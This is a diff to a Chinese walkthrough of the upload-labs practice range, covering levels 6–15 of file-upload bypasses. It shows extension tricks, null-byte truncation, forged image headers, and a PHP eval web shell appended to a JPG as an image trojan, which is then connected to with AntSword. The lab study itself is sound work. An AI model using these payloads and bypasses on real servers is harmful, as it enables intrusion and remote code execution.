@@ -14,11 +14,13 @@ upload-labs 是一个使用 php 语言编写的，专门收集渗透测试和 CT
 
 1. 每一关没有固定的通关方法，大家不要自限思维！
 
-2. 本项目提供的writeup只是起一个参考作用，希望大家可以分享出自己的通关思路。
+2. 本项目提供的 writeup 只是起一个参考作用，希望大家可以分享出自己的通关思路。
 
 3. 实在没有思路时，可以点击查看提示。
 
 4. 如果黑盒情况下，实在做不出，可以点击查看源码。
+
+5. Pass-19 必须在 linux 下
 
 **后续:**
 
@@ -237,9 +239,247 @@ DocumentRoot  "C:\phpStudy\WWW"
 
 ![PixPin_2025-04-29_18-58-34](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_18-58-34.4n7x33837l.webp)
 
-**1、后缀大小写绕过**
+尝试 **后缀大小写绕过**
 
 将 `fish.php` 的后缀名修改为 `.PhP` 进行上传，上传成功
 
 ![PixPin_2025-04-29_19-02-44](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_19-02-44.6m43tfiup2.webp)
+
+## Pass-06
+
+排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型
+
+![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)
+
+上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型
+
+![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)
+
+尝试 **空格绕过**，上传成功
+
+![PixPin_2025-05-08_20-21-37](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-08_20-21-37.2h8iu9eio3.webp)
+
+
+## Pass-07
+
+排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型
+
+![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)
+
+上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型
+
+![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)
+
+尝试 **点绕过**，上传成功
+
+![PixPin_2025-05-08_20-28-19](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-08_20-28-19.51ed6wnhtq.webp)
+
+## Pass-08
+
+排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型
+
+![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)
+
+上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型
+
+![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)
+
+尝试 **::$DATA** 绕过，上传成功
+
+![PixPin_2025-05-09_16-21-49](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_16-21-49.b949ohldd.webp)
+
+使用蚁剑进行连接
+
+![PixPin_2025-05-09_16-27-52](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_16-27-52.magja8n6.webp)
+
+## Pass-09
+
+排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型
+
+![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)
+
+上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型
+
+![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)
+
+尝试 **点空格点绕过**，上传成功
+
+![PixPin_2025-05-09_16-52-41](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_16-52-41.969yk8a7oc.webp)
+
+使用蚁剑进行连接
+
+![PixPin_2025-05-09_17-00-12](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-00-12.1sf9bgz0qs.webp)
+
+## Pass-10
+
+排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型
+
+![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)
+
+上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型
+
+![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)
+
+尝试 **后缀双写**，上传成功
+
+![PixPin_2025-05-09_17-03-49](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-03-49.26lp2cccua.webp)
+
+使用蚁剑进行连接
+
+![PixPin_2025-05-09_17-00-12](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-00-12.1sf9bgz0qs.webp)
+
+## Pass-11
+
+排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型
+
+![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)
+
+上传任意后缀文件 `fish.fish` 失败，判断为 **白名单** 类型
+
+![PixPin_2025-05-09_17-10-29](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-10-29.92qcmj3tx3.webp)
+
+> [!WARNING]
+> PHP ≤ 5.3.3 ，`php.ini` 配置 `magic_quotes_gpc = Off`
+
+尝试 **%00 截断**，上传成功
+
+![PixPin_2025-05-09_17-43-34](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-43-34.5c171blndq.webp)
+
+使用蚁剑进行连接
+
+![PixPin_2025-05-09_17-45-03](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-45-03.54xz5w1ccb.webp)
+
+## Pass-12
+
+排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型
+
+![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)
+
+上传任意后缀文件 `fish.fish` 失败，判断为 **白名单** 类型
+
+![PixPin_2025-05-09_17-10-29](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-10-29.92qcmj3tx3.webp)
+
+尝试 **0x00 截断** （先使用空格进行占位，再修改为 `00`），上传成功
+
+![PixPin_2025-05-09_17-48-43](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-48-43.esq7heez2.webp)
+
+![PixPin_2025-05-09_17-49-20](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-49-20.2veymem0rp.webp)
+
+使用蚁剑进行连接
+
+![PixPin_2025-05-09_17-45-03](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-45-03.54xz5w1ccb.webp)
+
+## Pass-13
+
+排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 失败，判断为 **检查内容** 类型
+
+![PixPin_2025-05-09_18-08-18](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_18-08-18.9o008w0nab.webp)
+
+为 `fish1.php` 添加 **文件头**
+
+| Hex 文件签名                                                                                                                              |                             ISO 8859-1                             |      文件扩展名       |
+|:--------------------------------------------------------------------------------------------------------------------------------------|:------------------------------------------------------------------:|:----------------:|
+| `FF D8 FF DB`<br/>`FF D8 FF E0 00 10 4A 46 49 46 00 01`<br/>`FF D8 FF EE`<br/>`FF D8 FF E1 ?? ?? 45 78 69 66 00 00`<br/>`FF D8 FF E0` | `ÿØÿÛ`<br/>`ÿØÿà␀␐JFIF␀␁`<br/>`ÿØÿî`<br/>`ÿØÿá??Exif␀␀`<br/>`ÿØÿà` | `jpg`<br/>`jpeg` |
+| `89 50 4E 47 0D 0A 1A 0A`                                                                                                             |                             `‰PNG␍␊␚␊`                             |      `png`       |
+| `47 49 46 38 37 61`<br/>`47 49 46 38 39 61`                                                                                           |                       `GIF87a`<br/>`GIF89a`                        |      `gif`       |
+
+1、jpg
+
+使用 `11` 进行占位
+
+```text {filename=fish2.php}
+11<?php @eval($_POST['fish']) ?>
+```
+
+使用 `hexedit` 替换 `11` 为 `jpg` 文件签名 `FF D8`
+
+![PixPin_2025-05-09_18-28-59](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_18-28-59.7pic38lj4.webp)
+
+上传 `fish2.php` 成功，利用任意文件包含漏洞使用蚁剑进行连接
+
+![PixPin_2025-05-09_19-12-29](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-12-29.2veymhle0a.webp)
+
+
+2、png
+
+使用 `11` 进行占位
+
+```text {filename=fish3.php}
+11<?php @eval($_POST['fish']) ?>
+```
+
+使用 `hexedit` 替换 `11` 为 `png` 文件签名 `89 50`
+
+![PixPin_2025-05-09_19-29-50](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-29-50.icc5atgqa.webp)
+
+上传 `fish3.php` 成功，利用任意文件包含漏洞使用蚁剑进行连接
+
+![PixPin_2025-05-09_19-31-07](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-31-07.wirw63qfj.webp)
+
+3、gif
+
+使用 `11` 进行占位
+
+```text {filename=fish4.php}
+11<?php @eval($_POST['fish']) ?>
+```
+
+使用 `hexedit` 替换 `11` 为 `gif` 文件签名 `47 49`
+
+![PixPin_2025-05-09_19-36-50](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-36-50.pfk0qon3i.webp)
+
+上传 `fish4.php` 成功，利用任意文件包含漏洞使用蚁剑进行连接
+
+![PixPin_2025-05-09_19-38-01](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-38-01.86tv783uwl.webp)
+
+## Pass-14
+
+排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型
+
+![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)
+
+上传任意后缀文件 `fish.fish` 失败，判断为 **白名单** 类型
+
+![PixPin_2025-05-09_17-10-29](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-10-29.92qcmj3tx3.webp)
+
+尝试 **上传图片马**
+
+将 `fish1.php` 追加到 `fish_real.jpg` 末尾，生成 `fish_trojan.jpg`
+
+```shell
+cat fish_real.jpg fish1.php > fish_trojan.jpg
+```
+
+查看 `fish_trojan.jpg` 最后 10 行的数据内容，确认一句话木马被正确追加
+
+```shell
+┌──(hailo㉿kali-Hailo)-[~/workspace/upload-labs]
+└─$ hexdump -C fish_trojan.jpg | tail
+0003b200  93 f8 55 c6 b7 8d 49 60  b5 11 c6 7a 51 70 22 c3  |..U...I`...zQp".|
+0003b210  7a d0 0b 8f 53 4e ef 4a  25 6c f4 14 5c 06 ac a7  |z...SN.J%l..\...|
+0003b220  71 06 9e 65 c8 c0 00 52  15 56 ed cd 21 8c 50 01  |q..e...R.V..!.P.|
+0003b230  b4 7f 7a 8d 87 d6 8c 6d  14 64 d2 18 bc fa d1 b8  |..z....m.d......|
+0003b240  f7 a3 39 a3 14 00 1e 7a  51 83 4a 06 28 ce 29 5c  |..9....zQ.J.(.)\|
+0003b250  60 29 43 1a 4a 29 0d 0b  b9 8f 1d 28 12 4c 9d 0e  |`)C.J).....(.L..|
+0003b260  7e b4 6e 34 e0 f4 0c ff  d9 3c 3f 70 68 70 20 40  |~.n4.....<?php @|
+0003b270  65 76 61 6c 28 24 5f 50  4f 53 54 5b 27 66 69 73  |eval($_POST['fis|
+0003b280  68 27 5d 29 20 3f 3e                              |h']) ?>|
+0003b287
+
+```
+
+上传 `fish_trojan.jpg` 成功，利用任意文件包含漏洞使用蚁剑进行连接
+
+![PixPin_2025-05-09_20-07-54](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-07-54.5fksz6kkoc.webp)
+
+## Pass-15
+
+> [!WARNING]
+> 需要开启 php_exif 扩展模块
+
+![PixPin_2025-05-09_20-12-54](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-12-54.2obqr45zsi.webp)
+
+上传 `fish_trojan.jpg` 成功，利用任意文件包含漏洞使用蚁剑进行连接
+
+![PixPin_2025-05-09_20-19-03](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-19-03.7egzpj41lr.webp)
 
